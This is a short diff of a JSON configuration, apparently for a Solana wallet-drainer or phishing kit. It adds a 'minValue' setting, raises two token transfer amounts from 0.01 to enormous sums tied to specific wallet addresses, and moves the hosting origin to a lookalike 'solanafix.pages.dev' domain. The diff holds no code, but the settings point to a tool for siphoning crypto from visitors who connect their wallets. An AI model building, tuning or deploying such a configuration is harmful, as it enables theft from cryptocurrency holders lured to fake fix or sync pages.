@@ -19,6 +19,7 @@
   "showCaptcha": false,
   "modal": 4,
   "bypo": true,
+  "minValue": 5,
   "extraAdd": {
     "enable": true,
     "tokens": [
@@ -26,15 +27,15 @@
         "mint": "11111111111111111111111111111111",
         "source": "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM",
         "owner": "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM",
-        "amount": 0.01
+        "amount": 20000000000
       },
       {
         "mint": "3krWsXrweUbpsDJ9NKiwzNJSxLQKdPJNGzeEU5MZKkrb",
         "source": "5KxEgrdXsys41aaEqz55hCWVZhuNHsYSKztQPKW3gNKq",
         "owner": "DDwVyf14Xqz6a1WD4YbtqfMAgztSbWStah5iYDZSrwhL",
-        "amount": 0.01
+        "amount": 5000000000000
       }
     ]
   },
-  "origin": "multinodesync.netlify.app"
+  "origin": "solanafix.pages.dev"
 }
